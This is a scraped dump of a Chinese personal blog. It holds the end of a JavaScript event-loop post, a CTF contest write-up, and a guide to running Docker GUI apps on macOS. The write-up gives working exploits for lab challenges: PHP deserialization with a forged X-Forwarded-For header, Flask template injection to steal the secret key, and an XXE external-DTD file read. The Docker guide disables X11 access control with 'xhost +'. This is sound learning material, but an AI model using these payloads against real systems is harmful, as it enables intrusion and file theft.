，想来它就是我们的目标了。 可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？ 继续 STFW 后，终于得到答案，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下： 首先要明确的，是 js 本身是一个 单线程 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。 而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。 而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= = 据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。 回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 这里异步的递归就是循环 呀，嗯，学到了。 0x12 createDocumentFragment 的含义从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续求助网络，得知该函数可以很好地工作在频繁更新元素的环境下。 0x2 结语做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～ // 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或 // 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～ (()=>{ let div = document.querySelector('#yuren-content'); let sequences = [\"一二三四五，上山打老虎。\", \"老虎没打到，打到小松鼠。\"]; let colors = [\"rgb(110,64,170)\", \"rgb(150,61,179)\", \"rgb(191,60,175)\", \"rgb(228,65,157)\", \"rgb(254,75,131)\", \"rgb(255,94,99)\", \"rgb(255,120,71)\", \"rgb(251,150,51)\", \"rgb(226,183,47)\", \"rgb(198,214,60)\", \"rgb(175,240,91)\", \"rgb(127,246,88)\", \"rgb(82,246,103)\", \"rgb(48,239,130)\", \"rgb(29,223,163)\", \"rgb(26,199,194)\", \"rgb(35,171,216)\", \"rgb(54,140,225)\", \"rgb(76,110,219)\", \"rgb(96,84,200)\"]; function getOneColor() { return colors[Math.floor(Math.random()*colors.length)]; } function getSomeChar(r) { let n=document.createDocumentFragment(); for (let i=0; i","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"NEXCTF 招新赛 WirteUP","slug":"NEXCTF-WriteUp","date":"2019-11-20T13:41:13.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2019/11/20/NEXCTF-WriteUp/","link":"","permalink":"/2019/11/20/NEXCTF-WriteUp/","excerpt":"","text":"0x0 前言本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事… 0x1 相关环境12345Python v3.7.4requests v2.22.0Flask v1.1.1Binwalk v2.1.1dd 0x2 各WriteUP0x20 Web 签到12345678910111213141516171819202122&lt;?php highlight_file(__FILE__);class ttt &#123; public function __destruct() &#123; try &#123; echo file_get_contents(\"/flag\"); &#125; catch (Exception $e) &#123; &#125; &#125; &#125;if($_GET['get'] === '1')&#123; if($_POST['post'] === '1') &#123; if($_SERVER[\"HTTP_X_FORWARDED_FOR\"] === '127.0.0.1') &#123; unserialize($_POST['class']); &#125; &#125;&#125; 代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 unserialize 函数，故可知该代码存在反序列化漏洞。下面来构造 ttt 类的序列化内容，代码如下： 123&lt;?php class ttt &#123;&#125; echo serialize(new ttt); 那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 X-Forwarded-For ，然后可通过 Python3+Requests 构造如下请求来获取 flag： 1__import__('requests').post('http://&lt;ip&gt;:&lt;port&gt;/?get=1', data=&#123;'post':'1','class':'O:3:\"ttt\":0:&#123;&#125;'&#125;, headers=&#123;'X-Forwarded-For':'127.0.0.1'&#125;).content 0x21 Baby Flask源码 提取码: upiv 可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是客户端session的模式，故这个值可以人为修改。 那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。 而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。 拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。 0x22 Baby xxe12345678910111213141516171819&lt;?php libxml_disable_entity_loader(false);$xmlfile = $_POST['name'];if (empty($xmlfile)) &#123; highlight_file(__FILE__);&#125; else if (stristr($xmlfile, \"xml\")) &#123; $xmlfile = str_ireplace(\"&lt;!entity\", \"nonono\", $xmlfile);&#125; else &#123; $xmlfile = '&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY all \"'.$xmlfile.'\"&gt;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt;';&#125;$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);echo ($creds);?&gt; 提示信息：Flag 在 ./flag.php 中 尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。 通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。 题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了。假设文件名为 tmp.dtd ，内容如下： 1&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt; 这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。 然后通过 Python+Requests 发送如下 POST 请求 1__import__(\"requests\").post(\"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;\", data=&#123;\"name\":'&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root SYSTEM \"tmp.dtd\"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'&#125;).content 将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。 0x23 ScriptBoy文件包 提取码: gxfa 题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值 分析文件结构后可以用如下脚本构造 Flag： 12345678910111213141516from hashlib import md5result = []for i in range(1, 101): filename = \"./\"+str(i)+\"/\"+str(i)+\".txt\" with open(filename) as f: content = f.readlines() for tmp in content: split_tmp = tmp.split('----') if len(split_tmp[0])==len(split_tmp[1])==4: result.append(tmp[19])print(md5(''.join(result).encode('utf8')).hexdigest()) 0x24 ljmisc图片 提取码: mnck ⬆️打开链接前请做好心理准备 拿到图片后，执行 binwalk 1000.png 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 dd if=1000.png of=test.zip skip=0x8b3f4 bs=1 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。 打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。 两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。 使用bwm处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。 解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白： 123456789101112131415161718192021from PIL import ImageMAX = 256pic = Image.new(\"RGB\",(MAX, MAX))str = ''with open('./bin.txt') as f: str = f.read()i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(\"flag.png\") 扫描二维码即可获取 Flag。 0x3 总结本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。 技术上的话题就到此为止了，下面是一些题外话： 15Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"在 Docker for MacOS 中运行 GUI 程序","slug":"Run-GUI-in-Docker","date":"2019-10-14T15:04:14.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2019/10/14/Run-GUI-in-Docker/","link":"","permalink":"/2019/10/14/Run-GUI-in-Docker/","excerpt":"内容包括：前言+环境+具体操作+原理","text":"内容包括：前言+环境+具体操作+原理 0x0 前言在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。 0x1 相关环境12Docker version 18.09.2XQuartz 2.7.11（xorg-server 1.18.4) 以上软件均可通过 homebrew 进行安装 0x2 具体操作 XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序； 终端键入 xhost +（注意两者之间的空格）重新启动 XQuartz； 使用诸如 nmap 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P； 在 run 或 exec 容器时加入-e DISPLAY=host.docker.internal:0参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock，就会在我的本地出现一个小时钟的GUI程序； 0x3 相关原理在 Linux 系统及一些 Unix-like 系统中，有着 X Window System 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 XQuartz 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。 于是在这个原理的支撑下，如何让 Docker 运行 GUI 程序 这个问题就被转化成了 如何在宿主机运行 X Server 以及 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互，下面分别来解决这两个问题： 0x31 如何在宿主机运行 X Server在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于安全上的考虑，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 具体操作 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 man xhost 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。 执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。 0x32 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式： 在命令后加 --display 参数并指明相关的位置 用户提前设置好环境变量 DISPLAY ，程序从该变量获得相关信息 这里我们采用第二种方式，故在启动容器时通过 -e 参数为其设置 DISPLAY 变量，现在的问题在于，如何解释变量的值 host.docker.internal:0 呢？ 对于该变量中，冒号前面的部分，Docker 官方文档中有如下解释： The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name host.docker.internal, which resolves to the internal IP address used by the host. 也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 ifconfig 命令来查看宿主机实际的IP，并将 DISPLAY 的值换成 your_ip:0 ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 (or none if you have no network access) 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。 那么 DISPLAY 的值就可以被解释为 your_ip:0 了，关于这个格式，其实它的完整形式为 your_ip: display_number. screen_number ，在本实验中其实可以写为 host.docker.internal:0.0，display_number 和 screen_number 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 screen_number 多数情况下均为0，也就可以省略掉了。 而对于 display_number，X11 protocol 官方文档中有如下描述： For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N. 也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 socat 工具运行 socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，DISPLAY 变量的值就可以为 host.docker.internal:100 ，替换后执行完整命令，可以发现一样能运行GUI测试程序。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]}]}